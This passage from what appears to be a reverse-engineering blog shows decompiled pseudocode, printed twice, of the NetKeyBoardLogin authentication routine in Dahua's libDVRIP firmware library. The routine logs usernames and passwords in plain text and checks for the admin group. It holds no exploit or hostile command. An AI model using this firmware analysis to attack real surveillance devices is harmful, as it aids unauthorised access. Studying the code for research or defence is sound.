class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v45, v49);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v49);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_4CB734(</span><br><span class="line">      <span class="number">5</span>,</span><br><span class="line">      <span class="string">&quot;libDVRIP-404300&quot;</span>,</span><br><span class="line">      <span class="string">&quot;%s::%s:%d name = %s, password = %s \n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NetKeyBoardLogin&quot;</span>,</span><br><span class="line">      <span class="number">918</span>,</span><br><span class="line">      v39[<span class="number">0</span>],</span><br><span class="line">      v41[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="keyword">sizeof</span>(v50));</span><br><span class="line">    v50[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    v50[<span class="number">2</span>] = (<span class="keyword">int</span>)v39[<span class="number">0</span>];</span><br><span class="line">    v50[<span class="number">3</span>] = (<span class="keyword">int</span>)v41[<span class="number">0</span>];</span><br><span class="line">    HIWORD(v50[<span class="number">5</span>]) = <span class="number">5000</span>;</span><br><span class="line">    v50[<span class="number">6</span>] = (<span class="keyword">int</span>)<span class="string">&quot;NetKeyBoard&quot;</span>;</span><br><span class="line">    v50[<span class="number">7</span>] = *(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">132596</span>;</span><br><span class="line">    v50[<span class="number">11</span>] = v43[<span class="number">0</span>];</span><br><span class="line">    v50[<span class="number">8</span>] = v45[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v33 = <span class="number">0</span>;</span><br><span class="line">      v20 = sub_141E80(&amp;Dahua::Component::ClassID::local, &amp;Dahua::Component::ServerInfo::none, &amp;v33);</span><br><span class="line">      <span class="keyword">if</span> ( v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        v21 = (*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *))(*(_DWORD *)v20 + <span class="number">12</span>))(v20, v50);</span><br><span class="line">        v22 = v33;</span><br><span class="line">        v23 = (<span class="keyword">void</span> *)sub_4D7DC4(v21);</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          v23 = _dynamic_cast(</span><br><span class="line">                  v23,</span><br><span class="line">                  (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IUnknown,</span><br><span class="line">                  (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IClient,</span><br><span class="line">                  <span class="number">0</span>);</span><br><span class="line">        v36 = v23;</span><br><span class="line">        v37 = v22;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v36 = <span class="number">0</span>;</span><br><span class="line">        v37 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      sub_141DE8(a1 + <span class="number">56</span>, &amp;v36);</span><br><span class="line">      sub_F30C0(&amp;v36);</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = *(_DWORD *)(a1 + <span class="number">56</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = sub_12FCE4(a1 + <span class="number">56</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v25 + <span class="number">24</span>))(v25) )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = sub_12FCE4(a1 + <span class="number">56</span>);</span><br><span class="line">        v24 = (*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v26 + <span class="number">28</span>))(v26);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v24 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_4CB734(</span><br><span class="line">      <span class="number">5</span>,</span><br><span class="line">      <span class="string">&quot;libDVRIP-404300&quot;</span>,</span><br><span class="line">      <span class="string">&quot;%s::%s:%d loginSuccess = %d \n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NetKeyBoardLogin&quot;</span>,</span><br><span class="line">      <span class="number">950</span>,</span><br><span class="line">      v24);</span><br><span class="line">    <span class="keyword">if</span> ( v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(a1 + <span class="number">38</span>) = <span class="number">1</span>;</span><br><span class="line">      v27 = *(_BYTE *)(*(_DWORD *)(a1 + <span class="number">16</span>) + <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_4CB734(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;CmdsNetKeyBoard::NetKeyBoardLogin&gt;&gt;&gt;&gt;&gt;login user failed\n&quot;</span>);</span><br><span class="line">      *(_BYTE *)(a1 + <span class="number">38</span>) = <span class="number">0</span>;</span><br><span class="line">      v27 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">40</span>) = v27;</span><br><span class="line">    v28 = a1 + <span class="number">34</span>;</span><br><span class="line">    v29 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v30 = *(_BYTE *)++v28;</span><br><span class="line">      v29 += v30;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v28 != a1 + <span class="number">41</span> );</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">42</span>) = v29;</span><br><span class="line">    v31 = sub_F3512(a1, **(_DWORD **)(a1 + <span class="number">8</span>), a1 + <span class="number">20</span>, <span class="number">0</span>, <span class="number">500000</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v31 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4CB734(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;%s(%d)--&quot;</span>, <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>, <span class="number">979</span>);</span><br><span class="line">      sub_4CB734(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;SBM Error(%d).\n&quot;</span>, v31);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v45);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v43);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v41);</span><br><span class="line">    v15 = (<span class="keyword">int</span> *)v39;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = sub_F3442(a1, **(_DWORD **)(a1 + <span class="number">8</span>));</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v50[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;v50[<span class="number">2</span>];</span><br><span class="line">    v50[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    LOBYTE(v50[<span class="number">2</span>]) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v50, v7 + <span class="number">8</span>);</span><br><span class="line">    sub_F30D4(v8);</span><br><span class="line">    sub_5D774C(v49, <span class="number">0</span>);</span><br><span class="line">    v9 = sub_64324(&amp;v34);</span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, _DWORD *))(*(_DWORD *)v9 + <span class="number">72</span>))(v9, v50, v49);</span><br><span class="line">    v10 = sub_5D88E0((<span class="keyword">int</span>)v49, (<span class="keyword">int</span>)<span class="string">&quot;Group&quot;</span>);</span><br><span class="line">    sub_5D7918(v38, v10);</span><br><span class="line">    v11 = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::compare(v38, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v38);</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = sub_64324(&amp;v34);</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *))(*(_DWORD *)v13 + <span class="number">60</span>))(v13, v50);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = sub_12FCE4(a1 + <span class="number">56</span>);</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v14 + <span class="number">32</span>))(v14);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_5D7EF2(v49, v12);</span><br><span class="line">    v15 = v50;</span><br><span class="line">LABEL_34:</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v15);</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_39:</span><br><span class="line">  sub_64310(&amp;v34);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_14149E</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> *v15; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> *v16; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">void</span> *v23; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// t1</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [sp+14h] [bp-16Ch] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v34; <span class="comment">// [sp+18h] [bp-168h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [sp+1Ch] [bp-164h]</span></span><br><span class="line">  <span class="keyword">void</span> *v36; <span class="comment">// [sp+20h] [bp-160h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [sp+24h] [bp-15Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v38[<span class="number">24</span>]; <span class="comment">// [sp+28h] [bp-158h] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v39[<span class="number">2</span>]; <span class="comment">// [sp+40h] [bp-140h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [sp+48h] [bp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v41[<span class="number">2</span>]; <span class="comment">// [sp+58h] [bp-128h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [sp+60h] [bp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v43[<span class="number">2</span>]; <span class="comment">// [sp+70h] [bp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [sp+78h] [bp-108h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v45[<span class="number">2</span>]; <span class="comment">// [sp+88h] [bp-F8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// [sp+90h] [bp-F0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v47[<span class="number">24</span>]; <span class="comment">// [sp+A0h] [bp-E0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v48[<span class="number">24</span>]; <span class="comment">// [sp+B8h] [bp-C8h] BYREF</span></span><br><span class="line">  _DWORD v49[<span class="number">6</span>]; <span class="comment">// [sp+D0h] [bp-B0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v50[<span class="number">32</span>]; <span class="comment">// [sp+E8h] [bp-98h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v50[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = (<span class="keyword">const</span> <span class="keyword">void</span> *)sub_4D68E4(</span><br><span class="line">                       <span class="string">&quot;UserManager&quot;</span>,</span><br><span class="line">                       &amp;Dahua::Component::ClassID::local,</span><br><span class="line">                       &amp;Dahua::Component::ServerInfo::none,</span><br><span class="line">                       v50);</span><br><span class="line">  <span class="keyword">if</span> ( v2</span><br><span class="line">    &amp;&amp; (v3 = _dynamic_cast(</span><br><span class="line">               v2,</span><br><span class="line">               (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IFactoryUnknown,</span><br><span class="line">               (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Manager::IUserManager::IFactory,</span><br><span class="line">               <span class="number">0</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">void</span> *))(*(_DWORD *)v3 + <span class="number">12</span>))(v3);</span><br><span class="line">    v5 = v50[<span class="number">0</span>];</span><br><span class="line">    v6 = (<span class="keyword">void</span> *)sub_4D7DF4(v4);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      v6 = _dynamic_cast(</span><br><span class="line">             v6,</span><br><span class="line">             (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IUnknown,</span><br><span class="line">             (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Manager::IUserManager,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">    v34 = v6;</span><br><span class="line">    v35 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v34 = <span class="number">0</span>;</span><br><span class="line">    v35 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v34 )</span><br><span class="line">  &#123;</span><br><span class="line">    return_f(</span><br><span class="line">      <span class="number">2</span>,</span><br><span class="line">      <span class="string">&quot;libDVRIP-404300&quot;</span>,</span><br><span class="line">      <span class="string">&quot;%s::%s:%d Failed to get user manager component!\n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NetKeyBoardLogin&quot;</span>,</span><br><span class="line">      <span class="number">747</span>);</span><br><span class="line">    v8 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">unsigned</span> __int8 *)(*(_DWORD *)(a1 + <span class="number">16</span>) + <span class="number">20</span>) != <span class="number">255</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)(a1 + <span class="number">20</span>), <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">23</span>) = <span class="number">104</span>;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">20</span>) = <span class="number">-104</span>;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">35</span>) = <span class="number">-112</span>;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">36</span>) = <span class="number">-1</span>;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">37</span>) = <span class="number">-2</span>;</span><br><span class="line">    v39[<span class="number">0</span>] = &amp;v40;</span><br><span class="line">    v40 = <span class="number">0</span>;</span><br><span class="line">    v42 = <span class="number">0</span>;</span><br><span class="line">    v44 = <span class="number">0</span>;</span><br><span class="line">    v46 = <span class="number">0</span>;</span><br><span class="line">    v39[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v41[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v43[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v45[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v16 = *(<span class="keyword">int</span> **)(a1 + <span class="number">8</span>);</span><br><span class="line">    v41[<span class="number">0</span>] = &amp;v42;</span><br><span class="line">    v43[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;v44;</span><br><span class="line">    v17 = *v16;</span><br><span class="line">    v45[<span class="number">0</span>] = (<span class="keyword">int</span>)&amp;v46;</span><br><span class="line">    v18 = sub_F3442(a1, v17);</span><br><span class="line">    v19 = v18;</span><br><span class="line">    <span class="keyword">if</span> ( v18 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v39, v18 + <span class="number">8</span>);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v47, v19 + <span class="number">32</span>);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v41, v47);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v47);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v48, v19 + <span class="number">84</span>);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v43, v48);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v48);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v49, v19 + <span class="number">108</span>);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v45, v49);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v49);</span><br><span class="line">    &#125;</span><br><span class="line">    return_f(</span><br><span class="line">      <span class="number">5</span>,</span><br><span class="line">      <span class="string">&quot;libDVRIP-404300&quot;</span>,</span><br><span class="line">      <span class="string">&quot;%s::%s:%d name = %s, password = %s \n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NetKeyBoardLogin&quot;</span>,</span><br><span class="line">      <span class="number">918</span>,</span><br><span class="line">      v39[<span class="number">0</span>],</span><br><span class="line">      v41[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v50, <span class="number">0</span>, <span class="keyword">sizeof</span>(v50));</span><br><span class="line">    v50[<span class="number">0</span>] = (<span class="keyword">int</span>)<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    v50[<span class="number">2</span>] = (<span class="keyword">int</span>)v39[<span class="number">0</span>];</span><br><span class="line">    v50[<span class="number">3</span>] = (<span class="keyword">int</span>)v41[<span class="number">0</span>];</span><br><span class="line">    HIWORD(v50[<span class="number">5</span>]) = <span class="number">5000</span>;</span><br><span class="line">    v50[<span class="number">6</span>] = (<span class="keyword">int</span>)<span class="string">&quot;NetKeyBoard&quot;</span>;</span><br><span class="line">    v50[<span class="number">7</span>] = *(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">132596</span>;</span><br><span class="line">    v50[<span class="number">11</span>] = v43[<span class="number">0</span>];</span><br><span class="line">    v50[<span class="number">8</span>] = v45[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v33 = <span class="number">0</span>;</span><br><span class="line">      v20 = sub_141E80(&amp;Dahua::Component::ClassID::local, &amp;Dahua::Component::ServerInfo::none, &amp;v33);</span><br><span class="line">      <span class="keyword">if</span> ( v20 )</span><br><span class="line">      &#123;</span><br><span class="line">        v21 = (*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *))(*(_DWORD *)v20 + <span class="number">12</span>))(v20, v50);</span><br><span class="line">        v22 = v33;</span><br><span class="line">        v23 = (<span class="keyword">void</span> *)sub_4D7DC4(v21);</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          v23 = _dynamic_cast(</span><br><span class="line">                  v23,</span><br><span class="line">                  (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IUnknown,</span><br><span class="line">                  (<span class="keyword">const</span> struct __class_type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Dahua::Component::IClient,</span><br><span class="line">                  <span class="number">0</span>);</span><br><span class="line">        v36 = v23;</span><br><span class="line">        v37 = v22;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v36 = <span class="number">0</span>;</span><br><span class="line">        v37 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      sub_141DE8(a1 + <span class="number">56</span>, &amp;v36);</span><br><span class="line">      sub_F30C0(&amp;v36);</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = *(_DWORD *)(a1 + <span class="number">56</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = sub_12FCE4(a1 + <span class="number">56</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v25 + <span class="number">24</span>))(v25) )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = sub_12FCE4(a1 + <span class="number">56</span>);</span><br><span class="line">        v24 = (*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>))(*(_DWORD *)v26 + <span class="number">28</span>))(v26);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v24 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return_f(</span><br><span class="line">      <span class="number">5</span>,</span><br><span class="line">      <span class="string">&quot;libDVRIP-404300&quot;</span>,</span><br><span class="line">      <span class="string">&quot;%s::%s:%d loginSuccess = %d \n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Src/Cmds_NetKeyBoard.cpp&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NetKeyBoardLogin&quot;</span>,</span><br><span class="line">      <span class="number">950</span>,</span><br><span class="line">      v24);</span><br><span class="line">    <span class="keyword">if</span> ( v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(a1 + <span class="number">38</span>) = <span class="number">1</span>;</span><br><span class="line">      v27 = *(_BYTE *)(*(_DWORD *)(a1 + <span class="number">16</span>) + <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      return_f(<span class="number">5</span>, <span class="string">&quot;libDVRIP-404300&quot;</span>, <span class="string">&quot;CmdsNetKeyBoard::NetKeyBoardLogin&gt;&gt;&gt;&gt;&gt;login user failed\n&quot;</span>);</span><br><span class="line">      *(_BYTE *)(a1 + <span class="number">38</span>) = <span class="number">0</span>;</span><br><span class="line">      v27 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">40</span>) = v27;</span><br><span class="line">    v28 = a1 + <span class="number">34</span>;</span><br><span class="line">    v29 = <span class="number">0</span>;</span><br><span class="line">    <span 